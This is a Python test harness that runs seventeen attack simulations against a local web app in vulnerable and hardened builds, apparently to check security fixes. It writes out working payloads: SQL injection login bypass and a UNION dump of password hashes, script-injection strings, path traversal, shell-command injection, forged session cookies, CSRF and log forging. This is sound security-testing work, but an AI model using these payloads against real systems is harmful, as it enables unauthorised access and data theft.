"""Attack simulations. Each attack returns (succeeded: bool, evidence: str) against a fresh server.
'succeeded' == the vulnerability is exploitable.  Run: python attacks.py"""
import base64, hashlib, hmac, json, os, re, sys
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from tests.client import Env, Client, PW, ADMIN_PW


def a01_sqli_login_bypass(env):
    c = Client(env.port)
    r = c.login("admin'--", "wrong-password")
    admin = c.get("/admin") if c.cookie else None
    ok = r.status == 200 and admin is not None and admin.status == 200
    return ok, "login(admin'--) -> %d; /admin -> %s" % (r.status, admin.status if admin else "no session")


def a02_sqli_union_dump(env):
    env.client("bob")
    c = env.client("alice")
    payload = "zzz' UNION SELECT id, username||':'||password_hash FROM users--"
    r = c.get("/search?q=" + quote(payload))
    ok = r.status == 200 and "bob:" in r.text
    return ok, "status %d, other users' rows %s" % (r.status, "LEAKED" if ok else "not returned")


def a03_weak_password_hash(env):
    env.client("alice")
    stored = env.app.db.execute("SELECT password_hash FROM users WHERE username='alice'").fetchone()[0]
    ok = stored == hashlib.md5(PW["alice"].encode()).hexdigest()
    return ok, "stored=%s... (plain MD5 of password: %s)" % (stored[:24], ok)


def a04_default_credentials(env):
    r = Client(env.port).login("admin", "admin123")
    return r.status == 200, "admin/admin123 -> %d" % r.status


def a05_session_forgery(env):
    mod = env.module
    key = getattr(mod, "SECRET_KEY", "supersecret123")      # attacker reads the key from the public source code
    data = base64.b64encode(json.dumps({"uid": 9999, "user": "mallory", "role": "admin"}).encode()).decode()
    forged = [data + "." + hashlib.md5((key + data).encode()).hexdigest(), data]
    c = env.client("mallory")                                # tampered genuine token: swap in admin uid
    if "." in c.cookie:
        p, s = c.cookie.split(".")
        pl = json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
        pl["uid"] = 1
        forged.append(base64.urlsafe_b64encode(json.dumps(pl, separators=(",", ":")).encode()).decode().rstrip("=") + "." + s)
    out = [Client(env.port).get("/admin", cookie=t).status for t in forged]
    return any(s == 200 for s in out), "forged cookies -> /admin statuses %s" % out


def a06_xss(env):
    c = env.client("alice")
    p1 = "<script>alert(1)</script>"
    r1 = c.get("/search?q=" + quote(p1))
    p2 = "<img src=x onerror=alert(2)>"
    nid = c.post("/notes", {"title": p2, "body": "hello"}).json()["id"]
    r2 = c.get("/notes/%d" % nid)
    refl = p1 in r1.text and "html" in r1.headers.get("content-type", "")
    stor = p2 in r2.text and "html" in r2.headers.get("content-type", "")
    return refl or stor, "reflected payload unescaped: %s; stored payload unescaped: %s; CSP: %s" % (
        refl, stor, r1.headers.get("content-security-policy", "none")[:30])


def a07_path_traversal(env):
    c = env.client("alice")
    secret = os.path.join(env.tmp, "secret.txt")
    payloads = ["../secret.txt", "..%2fsecret.txt", "%2e%2e/secret.txt", secret]
    res = []
    for p in payloads:
        r = c.get("/download?file=" + (p if "%" in p else quote(p)))
        res.append((r.status, "TOP-SECRET" in r.text))
    return any(x[1] for x in res), "payload statuses %s; secret read: %s" % ([x[0] for x in res], any(x[1] for x in res))


def a08_command_injection(env):
    c = env.client("alice")
    r = c.get("/ping?host=" + quote("127.0.0.1; echo INJ_$((6*7))"))
    return "INJ_42" in r.text, "status %d; injected command output present: %s" % (r.status, "INJ_42" in r.text)


def a09_idor(env):
    a, b = env.client("alice"), env.client("bob")
    nid = a.post("/notes", {"title": "diary", "body": "alice-private-data"}).json()["id"]
    r = b.get("/notes/%d" % nid)
    return "alice-private-data" in r.text, "bob reads alice's note #%d -> %d" % (nid, r.status)


def a10_csrf(env):
    c = env.client("alice")
    r = c.request("POST", "/notes", data={"title": "csrf", "body": "planted"},
                  headers={"Origin": "http://evil.example"}, auto_csrf=False)   # cross-site form post, no token
    return r.status == 201, "cross-origin POST without token -> %d" % r.status


def a11_error_disclosure(env):
    c = env.client("alice")
    r1 = c.get("/notes/abc")
    r2 = c.get("/search?q=" + quote("'"))
    leak = [("Traceback" in r.text or 'File "' in r.text or "SELECT" in r.text) for r in (r1, r2)]
    return any(leak), "statuses %s; internals leaked %s" % ([r1.status, r2.status], leak)


def a12_brute_force(env):
    pw = "admin123" if env.kind == "vulnerable" else ADMIN_PW
    guesses = ["123456", "password", "qwerty", "letmein", "welcome", "iloveyou", "dragon", pw, "x", "y"]
    c = Client(env.port)
    statuses = [c.login("admin", g).status for g in guesses]
    return 200 in statuses, "10 guesses (correct is #8) -> statuses %s" % statuses


def a13_user_enumeration(env):
    env.client("alice")
    c = Client(env.port)
    r1, r2 = c.login("alice", "wrong-password-1"), c.login("nosuchuser", "wrong-password-1")
    return (r1.status, r1.text) != (r2.status, r2.text), "known user: %s | unknown user: %s" % (r1.text.strip(), r2.text.strip())


def a14_plaintext_at_rest(env):
    c = env.client("alice")
    c.post("/notes", {"title": "t", "body": "MARKER-secret-note-123"})
    raw = [r[0] for r in env.app.db.execute("SELECT body FROM notes")]
    ok = any("MARKER-secret-note-123" in r for r in raw)
    return ok, "raw DB body column: %s..." % raw[0][:28]


def a15_log_injection(env):
    c = Client(env.port)
    c.login("x\nLOGIN SUCCESS user=admin", "whatever-pass")
    lines = "\n".join(env.app.audit).split("\n")
    ok = any(l.startswith("LOGIN SUCCESS user=admin") for l in lines)
    return ok, "forged audit line present: %s" % ok


def a16_oversized_body(env):
    c = env.client("alice")
    try:
        r = c.post("/notes", {"title": "big", "body": "A" * 300000})
        return r.status == 201, "300 KB body -> %d" % r.status
    except OSError as e:
        return False, "connection refused/reset by server (%s)" % type(e).__name__


def a17_missing_hardening(env):
    c = Client(env.port)
    env.client("alice")
    r = c.login("alice", PW["alice"])
    need = ["content-security-policy", "x-content-type-options", "x-frame-options"]
    missing = [h for h in need if h not in r.headers]
    sc = r.headers.get("set-cookie", "")
    missing += [f for f in ("HttpOnly", "SameSite") if f not in sc]
    return bool(missing), "missing: %s" % (", ".join(missing) or "nothing")


ATTACKS = [
    ("VULN-01", "SQL injection: authentication bypass", a01_sqli_login_bypass),
    ("VULN-02", "SQL injection: UNION data extraction", a02_sqli_union_dump),
    ("VULN-03", "Weak password storage (unsalted MD5)", a03_weak_password_hash),
    ("VULN-04", "Default administrator credentials", a04_default_credentials),
    ("VULN-05", "Session forgery (hard-coded key / unsigned data)", a05_session_forgery),
    ("VULN-06", "Cross-site scripting (reflected + stored)", a06_xss),
    ("VULN-07", "Path traversal in file download", a07_path_traversal),
    ("VULN-08", "OS command injection", a08_command_injection),
    ("VULN-09", "Insecure direct object reference (IDOR)", a09_idor),
    ("VULN-10", "Cross-site request forgery (CSRF)", a10_csrf),
    ("VULN-11", "Verbose error / stack-trace disclosure", a11_error_disclosure),
    ("VULN-12", "No brute-force protection", a12_brute_force),
    ("VULN-13", "User enumeration via login messages", a13_user_enumeration),
    ("VULN-14", "Sensitive data stored in plaintext", a14_plaintext_at_rest),
    ("VULN-15", "Log injection / forging", a15_log_injection),
    ("VULN-16", "Unbounded request size (DoS)", a16_oversized_body),
    ("VULN-17", "Missing security headers / cookie flags", a17_missing_hardening),
]


def run(kind):
    out = {}
    for vid, name, fn in ATTACKS:
        env = Env(kind)
        try:
            ok, ev = fn(env)
        finally:
            env.close()
        out[vid] = {"name": name, "exploitable": ok, "evidence": ev}
    return out


if __name__ == "__main__":
    res = {k: run(k) for k in ("vulnerable", "secure")}
    os.makedirs("results", exist_ok=True)
    json.dump(res, open("results/attack_results.json", "w"), indent=2)
    print("%-8s %-52s %-12s %-12s" % ("ID", "Attack", "ORIGINAL", "HARDENED"))
    for vid, name, _ in ATTACKS:
        f = lambda k: "EXPLOITED" if res[k][vid]["exploitable"] else "blocked"
        print("%-8s %-52s %-12s %-12s" % (vid, name, f("vulnerable"), f("secure")))
    ne = sum(v["exploitable"] for v in res["vulnerable"].values())
    ns = sum(v["exploitable"] for v in res["secure"].values())
    print("\nExploitable: original %d/%d, hardened %d/%d" % (ne, len(ATTACKS), ns, len(ATTACKS)))
